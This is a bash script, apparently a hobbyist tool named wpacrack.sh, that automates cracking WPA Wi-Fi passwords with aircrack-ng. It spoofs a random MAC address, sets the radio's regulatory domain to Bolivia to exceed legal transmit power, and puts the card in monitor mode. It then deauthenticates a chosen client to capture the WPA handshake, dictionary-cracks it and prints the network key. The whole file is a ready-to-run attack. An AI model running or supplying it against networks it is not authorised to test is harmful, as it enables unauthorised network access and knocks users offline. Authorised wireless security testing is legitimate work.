#!/bin/bash
# wpacrack.sh v.1.1
# Create by Matthew Phillips
# New versions can be downloaded from www.phillips321.co.uk
#
VERSION="1.1"
# This tool requires aircrack-ng tools to be installed and run as root
#
# ChangeLog....
# Version 1.1 - Randomises MAC Address on start
# Version 1.0 - First Release

#################################################################
# CHECKING FOR ROOT
#################################################################
if [ `echo -n $USER` != "root" ]
then
    echo "MESSAGE:"
    echo "MESSAGE: ERROR: Please run as root!"
    echo "MESSAGE:"
    exit 1
fi

#################################################################
# CHECKING TO SEE IF INTERFACE IS PROVIDED
#################################################################
if [ -z ${1} ]
then
    echo "MESSAGE: Version number ${VERSION}"
    echo "MESSAGE: Usage: `basename ${0}` [interface] [BSSID] [channel] [client]"
    echo "MESSAGE: Example #`basename ${0}` wlan0 (everything else is optional)"
    exit 1
else
    INTERFACE="`echo "${1}" | cut -c 1-6`"
fi

#################################################################
# PUT WIFI IN HIGHPOWER AND MONITOR MODE AND RANDOM MAC
#################################################################
macchanger -r ${INTERFACE}
iw reg set BO
sleep 3
iwconfig ${INTERFACE} txpower 30
POWER=`iwlist ${INTERFACE} txpower | grep Current | tr -s ' ' | cut -d '(' -f2 | sed -e s/')'//`
echo "MESSAGE: ${INTERFACE} power set to ${POWER}"
echo "MESSAGE: Putting ${INTERFACE} in monitor mode"
airmon-ng start ${INTERFACE}

#################################################################
# GET INTERFACE MAC ADDRESS
#################################################################
MACADDRESS=`ifconfig ${INTERFACE} | grep ${INTERFACE} | tr -s ' ' | cut -d ' ' -f5 | cut -c 1-17`

#################################################################
# CHECK IF BSSID,CHANNEL & TARGETNAME WERE PROVIDED
#################################################################
if [ -z ${2} ] || [ -z ${3} ]; then
    #################################################################
    # SHOW VISIBLE WEP NETWORKS
    #################################################################
    echo "MESSAGE: Will now display all visible WPA networks"
    echo "MESSAGE: Once you have identified the network you wish to target press Ctrl-C to exit"
    read -p "MESSAGE: Press enter to view networks"
    airodump-ng --encrypt WPA ${INTERFACE} # mon0

    #################################################################
    # USER INPUT DETAILS FROM AIRODUMP
    #################################################################
    while true
    do
        echo -n "MESSAGE: Please enter the target BSSID here: "
        read -e BSSID
        echo -n "MESSAGE: Please enter the target channel here: "
        read -e CHANNEL
        echo "MESSAGE: Target BSSID            : ${BSSID}"
        echo "MESSAGE: Target Channel          : ${CHANNEL}"
        echo "MESSAGE: Interface MAC Address   : ${MACADDRESS}"
        echo -n "MESSAGE: Is this information correct? (y or n): "
        read -e CONFIRM
        case $CONFIRM in
                y|Y|YES|yes|Yes)
                break ;;
                *) echo "MESSAGE: Please re-enter information" ;;
        esac
    done
fi

#################################################################
# CHECK IF THE USER NEEDS TO FIND A CLIENT
#################################################################
#if [ -z {4} ]; then
    #################################################################
    # SHOW AP CLIENTS
    #################################################################
    echo "MESSAGE: Will now display all visable clients for ${BSSID}"
    echo "MESSAGE: Once you have identified the client you wish to target press Ctrl-C to exit"
        read -p "MESSAGE: Press enter to view networks"
    airodump-ng -c ${CHANNEL} --bssid ${BSSID} ${INTERFACE}
    while true
    do
        echo -n "MESSAGE: Please enter the target CLIENT here: "
        read -e CLIENT
        echo "MESSAGE: Target Client           : ${CLIENT}"
        echo -n "MESSAGE: Is this information correct? (y or n): "
                read -e CONFIRM
                case $CONFIRM in
                        y|Y|YES|yes|Yes)
                                break ;;
                        *) echo "MESSAGE: Please re-enter information" ;;
                esac
    done
#fi

#################################################################
# START DEAUTH TO CAPTURE WPA HANDSHAKE
#################################################################
echo "MESSAGE: Starting De-auth"
echo "MESSAGE: Once hand shake has been captured press Ctrl-C to exit"
read -p "MESSAGE: Press enter to attempt handshake capture"
xterm -e "sleep 1 && aireplay-ng -0 20 -a ${BSSID} -c ${CLIENT} ${INTERFACE}" &
airodump-ng -c ${CHANNEL} --bssid ${BSSID} -w psk ${INTERFACE}

#################################################################
# ATTEMPTING TO CRACK
#################################################################
aircrack-ng -w wpa.txt -b ${BSSID} psk*.cap -l key.txt

#################################################################
# OUTPUT BSSID AND KEY
#################################################################
KEY=`cat key.txt`
echo "MESSAGE: Target BSSID            : ${BSSID}"
echo "MESSAGE: Target Key              : ${KEY}"

#################################################################
# DELETE FILES CREATED DURING WEP CRACKING
#################################################################
airmon-ng stop mon0
rm psk* key.txt
exit 0
